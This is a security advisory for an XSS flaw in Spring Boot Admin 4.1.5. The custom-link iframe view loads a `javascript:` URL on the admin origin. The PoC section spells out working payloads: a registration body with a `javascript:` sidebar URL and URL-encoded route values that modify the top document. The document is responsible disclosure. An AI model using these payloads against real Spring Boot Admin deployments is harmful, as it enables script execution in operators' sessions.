# SPRING-BOOT-ADMIN-2026-05: Custom-link iframe view loads a `javascript:` URL on the admin origin

- Product: codecentric/spring-boot-admin (https://github.com/codecentric/spring-boot-admin)
- Reporter: thientc (VinSOC)
- Vendor status: reported 2026-11-18 through GitHub private vulnerability reporting, [GHSA-3x6c-vhwf-mh6w](https://github.com/codecentric/spring-boot-admin/security/advisories/GHSA-3x6c-vhwf-mh6w); in triage, no maintainer reply as of 2026-11-22
- CVE: requested from MITRE on 2026-11-23, pending
- Version: 4.1.5

## Summary

`IframeView.vue` renders `<iframe :src="params.url" sandbox="allow-scripts allow-same-origin">` with no scheme check. A `javascript:` URL there runs with the Spring Boot Admin origin and can change the top document. The URL reaches the view two ways: from an instance's `sidebar.links.N.url` metadata with `iframe` set, after the operator clicks the link, and from the route `/instances/<id>/custom-link/<url>`, where opening a crafted link is enough. In my lab both ran script on the SBA origin.

## Details

Metadata form. `POST /instances` stores `sidebar.links.0.url` and `sidebar.links.0.iframe` unchanged (`spring-boot-admin-server/src/main/java/de/codecentric/boot/admin/server/web/InstancesController.java:83`). `customLinksFromMetadata` copies `view.url` to `href` and `view.iframe || false` to `iframe` (`spring-boot-admin-server-ui/src/main/frontend/views/instances/shell/sidebar.vue:204-212`; the lab sent the string `"true"`). For an iframe link the sidebar renders a `router-link` to `instances/custom-link-view` with `params.url = view.href` (`sidebar.vue:137-142`).

Route form. The view is registered with path `custom-link/:url` under `instances` (`views/instances/iframe/index.ts:5-12`). `isEnabled: () => false` only hides it from the sidebar list (`sidebar.vue:220-232`); `viewRegistry.ts:147-160` builds a route for every registered view, so `/instances/<id>/custom-link/<url>` is routable. `InstanceShell.vue:31-32` renders the child view only when the instance resolves, so the route form needs the id of a registered instance.

Sink, `views/instances/iframe/IframeView.vue:2-5`:

```html
<iframe :src="params.url" sandbox="allow-scripts allow-same-origin">
```

A `javascript:` src runs with the SBA document's origin, and `allow-scripts allow-same-origin` lets it reach `top.document`. In the lab the iframe's script changed `top.document.title` and an attribute on the top `<html>` element, so the sandbox attribute does not contain it. SBA sets no CSP, and I saw none.

Instance ids are the first 12 hex digits of the SHA-1 of the health URL (`HashingInstanceUrlIdGenerator.java:35-39`), so anyone who knows a monitored app's health URL can compute one. The route value cannot contain `/`: Tomcat answered 400 to an encoded `https://` URL. A `javascript:` payload needs no slash.

## PoC

Lab: SBA 4.1.5 with the UI module, Spring Security form login, SSRF protection on with the mock's range allowed, and Chromium 140 logged in as a user. Each probe used a fresh registration, browser context and login, and the instance was deleted afterwards (204, then 404).

Metadata form, control:

```
POST /instances
{"name":"meta-control","managementUrl":"http://<mock>:8080/actuator","healthUrl":"http://<mock>:8080/actuator/health",
 "serviceUrl":"http://<mock>:8080/",
 "metadata":{"sidebar.links.0.label":"frame","sidebar.links.0.url":"https://docs.example.invalid/","sidebar.links.0.iframe":"true"}}
browser: /instances/<id>/details, click the sidebar link "frame"
-> iframe src https://docs.example.invalid/ (blocked by the lab's route guard); title unchanged; no marker
```

Metadata form, attack:

```
"metadata":{"sidebar.links.0.label":"frame","sidebar.links.0.iframe":"true",
            "sidebar.links.0.url":"javascript:void(top.document.documentElement.dataset.sbabr=top.document.title='<M>')"}
browser: /instances/<id>/details, click the sidebar link "frame"
-> location /instances/<id>/custom-link/javascript:void(...); top title = <M>; <html data-sbabr="<M>">; origin http://<sba>:8080
```

Route form, no metadata on the instance:

```
browser: /instances/<id>/custom-link/about%3Ablank                                   (control: iframe about:blank, nothing ran)
browser: /instances/<id>/custom-link/javascript%3Avoid%28top.document.documentElement.dataset.sbabr%3Dtop.document.title%3D%27<M>%27%29
         (title and data-sbabr = <M>, origin http://<sba>:8080)
browser: /instances/0000000000aa/custom-link/<same value>                            (unregistered id: GET /instances/0000000000aa 404, no iframe, no marker)
```

Two metadata-form attack and control pairs and two route-form attacks gave these results. The valid route-form control (`about:blank`) was run in one of the runs; in the others I used an encoded https URL, which the server rejects with 400, so it is not a valid control. After rebuilding the lab with Spring Boot 4.1.2, two more sweeps fired both forms.

## Impact

Script chosen by the attacker runs on the SBA origin with the logged-in operator's session. In the route form the attacker needs no SBA account and no control of a monitored app: a link to a registered instance's `custom-link` route is enough, and the operator only has to open it. In the metadata form the writer is whoever can register instance metadata, and the operator has to click the custom link.

In the same lab, script on the SBA origin (delivered through the sidebar label in SPRING-BOOT-ADMIN-2026-04) read the `XSRF-TOKEN` cookie and another monitored instance's synthetic `/actuator/env` through the proxy. I did not repeat that read through this view; here I only wrote markers to the page. I did not test other browsers, or how an outside attacker would learn an instance id in a real deployment. A CSP or a proxy that rejects such paths would change the effect.

Suggested fix: in `IframeView.vue` and `customLinksFromMetadata`, accept only `http:` and `https:` URLs (parse with `new URL()`), and drop or gate the `custom-link/:url` route so it loads only URLs from the instance's own metadata and not from the address bar. I did not test this patch.

## Affected versions

- Tested and affected: 4.1.5 (tag `4.1.5`, commit `c3034e1038afda381282fc7a9170a933a71a3e67`).
- Fixed in: no fixed release known.

Tested on a local Spring Boot lab with synthetic accounts and data only, in one browser (Chromium 140); no live deployment was tested. Version tested: 4.1.5.

## Severity

CVSS 3.1 base score **4.1** (Medium): `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:N/A:N`

- **AV:N** Registration, the proxy and the UI are plain HTTP endpoints.
- **AC:L** Metadata form: no condition beyond the stated preconditions once an instance is registered; SSRF protection is opt-in.
- **PR:L** Metadata form: registration needed an authenticated user in the lab. The route form needs no account but needs a registered instance id; scored alone it would be AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N (3.4). I scored the higher demonstrated form.
- **UI:R** The operator has to click the custom link (metadata form) or open the crafted URL (route form).
- **S:C** Script supplied through an instance or a crafted URL runs on the SBA origin with the operator's session.
- **C:L** In the same lab, script on the SBA origin read the CSRF cookie and another instance's synthetic `/actuator/env` through the proxy.
- **I:N** No state-changing request was demonstrated.
- **A:N** None demonstrated.

## Credit

thientc (VinSOC)
